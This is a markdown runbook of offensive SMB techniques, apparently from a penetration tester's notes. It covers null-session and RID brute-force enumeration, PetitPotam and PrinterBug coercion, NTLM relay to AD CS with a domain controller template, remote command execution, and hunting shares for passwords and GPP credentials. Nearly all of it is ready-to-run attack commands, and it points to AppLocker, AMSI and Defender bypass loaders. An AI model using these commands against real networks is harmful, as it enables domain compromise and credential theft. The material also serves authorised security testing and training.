---
tags: [protocol, smb, lateral-movement, coercion]
target_arch: x64
os: windows
---

# 🛡️ SMB Protocol Runbook (400/500 Level)

> [!ABSTRACT] 
> This runbook covers SMB from initial discovery to advanced coercion and execution. 
> **Goal**: Move from anonymous access to local admin execution or NTLM relay.

---

## 🔍 Phase 1: High-Signal Enumeration

> [!TIP] Preferred Tool: `NetExec` (formerly CrackMapExec)
> It is faster and more feature-rich than `smbmap`.

```bash
# General Check (Signing, Version, OS)
netexec smb <TARGET_IP>

# Check for Null Sessions / Guest Access
netexec smb <TARGET_IP> -u 'guest' -p '' --shares
netexec smb <TARGET_IP> -u '' -p '' --shares

# List Shares & Permissions (Authenticated)
netexec smb <TARGET_IP> -u <USER> -p <PASS> --shares

# RID Brute Force (Discover users via Null Session)
netexec smb <TARGET_IP> -u '' -p '' --rid-brute
```

---

## 🧲 Phase 2: NTLM Coercion & Relaying (400/500 Level)

> [!DANGER] OPSEC Warning
> Coercion techniques (PetitPotam, etc.) are highly visible to EDRs and SOCs. Use only if needed for initial foothold or cross-domain movement.

### 1. PetitPotam (MS-EFSRPC)
Force a machine to authenticate to your listener (Kali).
```bash
python3 PetitPotam.py -u <USER> -p <PASS> <LISTENER_IP> <TARGET_IP>
```

### 2. PrinterBug (SpoolSample)
Requires a valid domain user. Force the Print Spooler to authenticate.
```bash
python3 /opt/impacket/examples/printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> <LISTENER_IP>
```

### 3. NTLM Relay Workflow
If SMB Signing is **Disabled** on the target:
1. Start `ntlmrelayx.py`:
   ```bash
   python3 ntlmrelayx.py -tf targets.txt -smb2support --adcs --template DomainController
   ```
2. Trigger coercion from the victim to your Kali IP.

---

## 🚀 Phase 3: Execution & Lateral Movement

> [!INFO] Choosing your Execution Method
> Depending on the defense (AMSI/CLM/AppLocker), select the appropriate loader.

| Defense Scenario | Tool/Method | Link to Source |
| :--- | :--- | :--- |
| **No Restrictions** | `wmiexec.py` or `psexec.py` | `[[utilities/netcat]]` |
| **AppLocker Active** | `InstallUtil` Bypass | `[[03-loaders/clrunner.cs]]` |
| **CLM + AMSI Active** | C# Process Injection | `[[03-loaders/clinject.cs]]` |
| **Defender Monitoring** | AES Encrypted Shellcode | `[[04-encoders/aes/]]` |

### Manual Execution (via netexec)
```bash
# Execute command directly
netexec smb <TARGET_IP> -u <USER> -p <PASS> -x 'whoami /all'

# Execute via WMI (Stealthier than PSExec)
netexec smb <TARGET_IP> -u <USER> -p <PASS> --exec-method wmiexec -x 'ipconfig'
```

---

## 📂 Phase 4: Data Mining (Post-Exploitation)

> [!IMPORTANT]
> Once you have read access to a share (e.g., `Users` or `CompanyData`), search for sensitive strings.

```bash
# Recursive search for "password" in all files (Windows Native)
dir \<TARGET_IP>\Share\ /s /b | findstr /i "password"

# Hunt for GPP Passwords (Groups.xml)
netexec smb <TARGET_IP> -u <USER> -p <PASS> -M gpp_password
```

---

## 🔗 Related Notes
- [[Active Directory]] - For mapping SMB access to DA paths.
- [[Tunneling]] - If SMB is only reachable via pivot.
- [[03-loaders/RUNBOOK]] - For payload delivery details.
